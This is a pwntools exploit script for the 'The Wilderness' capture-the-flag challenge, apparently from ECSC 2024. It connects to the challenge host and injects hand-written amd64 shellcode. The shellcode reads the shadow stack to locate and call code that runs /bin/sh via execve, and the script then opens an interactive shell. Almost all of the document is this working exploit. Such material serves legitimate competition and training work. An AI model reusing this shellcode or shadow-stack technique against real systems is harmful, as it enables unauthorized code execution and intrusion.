#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 'thewilderness.challs.open.ecsc2024.it ' --port 38012 ./run.sh
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './run.sh'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'thewilderness.challs.open.ecsc2024.it'
port = int(args.PORT or 38012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

shellcode = asm('''
    endbr64;
    rdsspq rsp;
    mov rax, [rsp];
    sub ax, 5475;
    add ax, 0x126f;
    mov dil, 0x3b;
    mov esi, 0xdead01f;
    call rax;
''', arch = 'amd64', os = 'linux', bits = 64)

shellcode += b"/bin/sh"

# with open("./shellcode/shellcode.bin", "rb") as f:
#     shellcode = f.read()

io.sendlineafter(b"How many bytes do you want to write in The Wilderness?", str(len(shellcode)).encode())
io.sendafter(b"What do you want to do in The Wilderness?", shellcode)

io.interactive()

